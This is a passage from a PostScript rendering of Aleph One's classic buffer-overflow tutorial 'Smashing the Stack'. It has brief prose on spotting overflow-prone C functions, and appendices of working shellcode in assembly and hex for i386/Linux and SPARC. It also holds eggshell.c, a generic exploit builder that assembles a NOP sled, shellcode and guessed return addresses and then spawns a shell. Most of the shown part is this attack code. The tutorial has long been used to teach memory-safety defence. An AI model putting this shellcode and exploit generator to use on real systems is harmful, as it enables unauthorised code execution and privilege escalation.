(\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277) s
5 434 M
(\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377) s
5 362 M
(\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377) s
5 354 M
(\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377) s
5 346 M
(\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
5 274 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
5 266 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
5 258 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260) s
5 186 M
(\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260) s
5 178 M
(\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260) s
5 170 M
(\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277) s
5 98 M
(\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277) s
5 90 M
(\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277) s
5 82 M
(\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377) s
5 10 M
(\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377) s
5 2 M
(\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377) s
402 522 M
(\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
402 450 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
402 442 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244) s
402 434 M
(\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\277\260\244\377\377\277\260\244\377\277) s
402 362 M
(\260\244\377\277\260\244\377\277\260\244) s
402 354 M
(Warning: some arguments in previous message were lost) s
402 346 M
($) s
402 338 M
(------------------------------------------------------------------------------) s
402 322 M
(   On the first try!  It has certainly increased our odds.  Depending how ) s
402 314 M
(much environment data the exploit program has compared with the program ) s
402 306 M
(you are trying to exploit the guessed address may be to low or to high. ) s
402 298 M
(Experiment both with positive and negative offsets.) s
402 274 M
(                              Finding Buffer Overflows) s
402 266 M
(                              ~~~~~~~~~~~~~~~~~~~~~~~~) s
402 250 M
(   As stated earlier, buffer overflows are the result of stuffing more) s
402 242 M
(information into a buffer than it is meant to hold.  Since C does not have any) s
402 234 M
(built-in bounds checking, overflows often manifest themselves as writing past) s
402 226 M
(the end of a character array.  The standard C library provides a number of) s
402 218 M
(functions for copying or appending strings, that perform no boundary checking.) s
402 210 M
(They include: strcat\(\), strcpy\(\), sprintf\(\), and vsprintf\(\). These functions ) s
402 202 M
(operate on null-terminated strings, and do not check for overflow of the ) s
402 194 M
(receiving string.  gets\(\) is a function that reads a line from stdin into ) s
402 186 M
(a buffer until either a terminating newline or EOF.  It performs no checks for) s
402 178 M
(buffer overflows.  The scanf\(\) family of functions can also be a problem if ) s
402 170 M
(you are matching a sequence of non-white-space characters \(%s\), or matching a ) s
402 162 M
(non-empty sequence of characters from a specified set \(%[]\), and the array ) s
402 154 M
(pointed to by the char pointer, is not large enough to accept the whole ) s
402 146 M
(sequence of characters, and you have not defined the optional maximum field ) s
402 138 M
(width.  If the target of any of these functions is a buffer of static size, ) s
402 130 M
(and its other argument was somehow derived from user input there is a good) s
402 122 M
(posibility that you might be able to exploit a buffer overflow.) s
402 106 M
(   Another usual programming construct we find is the use of a while loop to) s
402 98 M
(read one character at a time into a buffer from stdin or some file until the) s
402 90 M
(end of line, end of file, or some other delimiter is reached.  This type of) s
402 82 M
(construct usually uses one of these functions: getc\(\), fgetc\(\), or getchar\(\).) s
402 74 M
(If there is no explicit checks for overflows in the while loop, such programs ) s
402 66 M
(are easily exploited.) s
402 50 M
(   To conclude, grep\(1\) is your friend.  The sources for free operating) s
402 42 M
(systems and their utilities is readily available.  This fact becomes quite) s
402 34 M
(interesting once you realize that many comercial operating systems utilities) s
402 26 M
(where derived from the same sources as the free ones.  Use the source d00d.) s
402 2 M
(     Appendix A - Shellcode for Different Operating Systems/Architectures) s
_R
S
%%Page: (13) 13
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 13 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (13) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~) s
5 506 M
(i386/Linux) s
5 498 M
(------------------------------------------------------------------------------) s
5 490 M
(        jmp    0x1f) s
5 482 M
(        popl   %esi) s
5 474 M
(        movl   %esi,0x8\(%esi\)) s
5 466 M
(        xorl   %eax,%eax) s
5 458 M
(        movb   %eax,0x7\(%esi\)) s
5 450 M
(        movl   %eax,0xc\(%esi\)) s
5 442 M
(        movb   $0xb,%al) s
5 434 M
(        movl   %esi,%ebx) s
5 426 M
(        leal   0x8\(%esi\),%ecx) s
5 418 M
(        leal   0xc\(%esi\),%edx) s
5 410 M
(        int    $0x80) s
5 402 M
(        xorl   %ebx,%ebx) s
5 394 M
(        movl   %ebx,%eax) s
5 386 M
(        inc    %eax) s
5 378 M
(        int    $0x80) s
5 370 M
(        call   -0x24) s
5 362 M
(        .string \\"/bin/sh\\") s
5 354 M
(------------------------------------------------------------------------------) s
5 338 M
(SPARC/Solaris) s
5 330 M
(------------------------------------------------------------------------------) s
5 322 M
(        sethi   0xbd89a, %l6) s
5 314 M
(        or      %l6, 0x16e, %l6) s
5 306 M
(        sethi   0xbdcda, %l7) s
5 298 M
(        and     %sp, %sp, %o0) s
5 290 M
(        add     %sp, 8, %o1) s
5 282 M
(        xor     %o2, %o2, %o2) s
5 274 M
(        add     %sp, 16, %sp) s
5 266 M
(        std     %l6, [%sp - 16]) s
5 258 M
(        st      %sp, [%sp - 8]) s
5 250 M
(        st      %g0, [%sp - 4]) s
5 242 M
(        mov     0x3b, %g1) s
5 234 M
(        ta      8) s
5 226 M
(        xor     %o7, %o7, %o0) s
5 218 M
(        mov     1, %g1) s
5 210 M
(        ta      8) s
5 202 M
(------------------------------------------------------------------------------) s
5 186 M
(SPARC/SunOS) s
5 178 M
(------------------------------------------------------------------------------) s
5 170 M
(        sethi   0xbd89a, %l6) s
5 162 M
(        or      %l6, 0x16e, %l6) s
5 154 M
(        sethi   0xbdcda, %l7) s
5 146 M
(        and     %sp, %sp, %o0) s
5 138 M
(        add     %sp, 8, %o1) s
5 130 M
(        xor     %o2, %o2, %o2) s
5 122 M
(        add     %sp, 16, %sp) s
5 114 M
(        std     %l6, [%sp - 16]) s
5 106 M
(        st      %sp, [%sp - 8]) s
5 98 M
(        st      %g0, [%sp - 4]) s
5 90 M
(        mov     0x3b, %g1) s
5 82 M
(        mov     -0x1, %l5) s
5 74 M
(        ta      %l5 + 1) s
5 66 M
(        xor     %o7, %o7, %o0) s
5 58 M
(        mov     1, %g1) s
5 50 M
(        ta      %l5 + 1) s
5 42 M
(------------------------------------------------------------------------------) s
5 18 M
(                 Appendix B - Generic Buffer Overflow Program) s
5 10 M
(                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~) s
402 522 M
(shellcode.h) s
402 514 M
(------------------------------------------------------------------------------) s
402 506 M
(#if defined\(__i386__\) && defined\(__linux__\)) s
402 490 M
(#define NOP_SIZE        1) s
402 482 M
(char nop[] = "\\x90";) s
402 474 M
(char shellcode[] =) s
402 466 M
(  "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b") s
402 458 M
(  "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd") s
402 450 M
(  "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";) s
402 434 M
(unsigned long get_sp\(void\) {) s
402 426 M
(   __asm__\("movl %esp,%eax"\);) s
402 418 M
(}) s
402 402 M
(#elif defined\(__sparc__\) && defined\(__sun__\) && defined\(__svr4__\)) s
402 386 M
(#define NOP_SIZE        4) s
402 378 M
(char nop[]="\\xac\\x15\\xa1\\x6e";) s
402 370 M
(char shellcode[] =) s
402 362 M
(  "\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e") s
402 354 M
(  "\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0") s
402 346 M
(  "\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08") s
402 338 M
(  "\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08";) s
402 322 M
(unsigned long get_sp\(void\) {) s
402 314 M
(  __asm__\("or %sp, %sp, %i0"\);) s
402 306 M
(}) s
402 290 M
(#elif defined\(__sparc__\) && defined\(__sun__\)) s
402 274 M
(#define NOP_SIZE        4) s
402 266 M
(char nop[]="\\xac\\x15\\xa1\\x6e";) s
402 258 M
(char shellcode[] =) s
402 250 M
(  "\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e") s
402 242 M
(  "\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0") s
402 234 M
(  "\\xdc\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\xaa\\x10\\x3f\\xff") s
402 226 M
(  "\\x91\\xd5\\x60\\x01\\x90\\x1b\\xc0\\x0f\\x82\\x10\\x20\\x01\\x91\\xd5\\x60\\x01";) s
402 210 M
(unsigned long get_sp\(void\) {) s
402 202 M
(  __asm__\("or %sp, %sp, %i0"\);) s
402 194 M
(}) s
402 178 M
(#endif) s
402 170 M
(------------------------------------------------------------------------------) s
402 154 M
(eggshell.c) s
402 146 M
(------------------------------------------------------------------------------) s
402 138 M
(/*) s
402 130 M
( * eggshell v1.0) s
402 122 M
( *) s
402 114 M
( * Aleph One / aleph1@underground.org) s
402 106 M
( */) s
402 98 M
(#include <stdlib.h>) s
402 90 M
(#include <stdio.h>) s
402 82 M
(#include "shellcode.h") s
402 66 M
(#define DEFAULT_OFFSET                    0) s
402 58 M
(#define DEFAULT_BUFFER_SIZE             512) s
402 50 M
(#define DEFAULT_EGG_SIZE               2048) s
402 34 M
(void usage\(void\);) s
402 18 M
(void main\(int argc, char *argv[]\) {) s
402 10 M
(  char *ptr, *bof, *egg;) s
402 2 M
(  long *addr_ptr, addr;) s
_R
S
%%Page: (14) 14
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 14 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (14) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;) s
5 514 M
(  int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;) s
5 498 M
(  while \(\(c = getopt\(argc, argv, "a:b:e:o:"\)\) != EOF\)) s
5 490 M
(    switch \(c\) {) s
5 482 M
(      case 'a':) s
5 474 M
(        align = atoi\(optarg\);) s
5 466 M
(        break;) s
5 458 M
(      case 'b':) s
5 450 M
(        bsize = atoi\(optarg\);) s
5 442 M
(        break;) s
5 434 M
(      case 'e':) s
5 426 M
(        eggsize = atoi\(optarg\);) s
5 418 M
(        break;) s
5 410 M
(      case 'o':) s
5 402 M
(        offset = atoi\(optarg\);) s
5 394 M
(        break;) s
5 386 M
(      case '?':) s
5 378 M
(        usage\(\);) s
5 370 M
(        exit\(0\);) s
5 362 M
(    }) s
5 346 M
(  if \(strlen\(shellcode\) > eggsize\) {) s
5 338 M
(    printf\("Shellcode is larger the the egg.\\n"\);) s
5 330 M
(    exit\(0\);) s
5 322 M
(  }) s
5 306 M
(  if \(!\(bof = malloc\(bsize\)\)\) {) s
5 298 M
(    printf\("Can't allocate memory.\\n"\);) s
5 290 M
(    exit\(0\);) s
5 282 M
(  }) s
5 274 M
(  if \(!\(egg = malloc\(eggsize\)\)\) {) s
5 266 M
(    printf\("Can't allocate memory.\\n"\);) s
5 258 M
(    exit\(0\);) s
5 250 M
(  }) s
5 234 M
(  addr = get_sp\(\) - offset;) s
5 226 M
(  printf\("[ Buffer size:\\t%d\\t\\tEgg size:\\t%d\\tAligment:\\t%d\\t]\\n",) s
5 218 M
(    bsize, eggsize, align\);) s
5 210 M
(  printf\("[ Address:\\t0x%x\\tOffset:\\t\\t%d\\t\\t\\t\\t]\\n", addr, offset\);) s
5 194 M
(  addr_ptr = \(long *\) bof;) s
5 186 M
(  for \(i = 0; i < bsize; i+=4\)) s
5 178 M
(    *\(addr_ptr++\) = addr;) s
5 162 M
(  ptr = egg;) s
5 154 M
(  for \(i = 0; i <= eggsize - strlen\(shellcode\) - NOP_SIZE; i += NOP_SIZE\)) s
5 146 M
(    for \(n = 0; n < NOP_SIZE; n++\) {) s
5 138 M
(      m = \(n + align\) % NOP_SIZE;) s
5 130 M
(      *\(ptr++\) = nop[m];) s
5 122 M
(    }) s
5 106 M
(  for \(i = 0; i < strlen\(shellcode\); i++\)) s
5 98 M
(    *\(ptr++\) = shellcode[i];) s
5 82 M
(  bof[bsize - 1] = '\\0';) s
5 74 M
(  egg[eggsize - 1] = '\\0';) s
5 58 M
(  memcpy\(egg,"EGG=",4\);) s
5 50 M
(  putenv\(egg\);) s
5 34 M
(  memcpy\(bof,"BOF=",4\);) s
5 26 M
(  putenv\(bof\);) s
5 18 M
(  system\("/bin/sh"\);) s
5 10 M
(}) s
402 522 M
(void usage\(void\) {) s
402 514 M
(  \(void\)fprintf\(stderr,) s
402 506 M
(    "usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>]\\n"\);) s
402 498 M
(}) s
402 490 M
(------------------------------------------------------------------------------) s
_R
S
%%Trailer
%%Pages: 14
%%DocumentNeededResources: font Courier-Bold Courier 
%%EOF
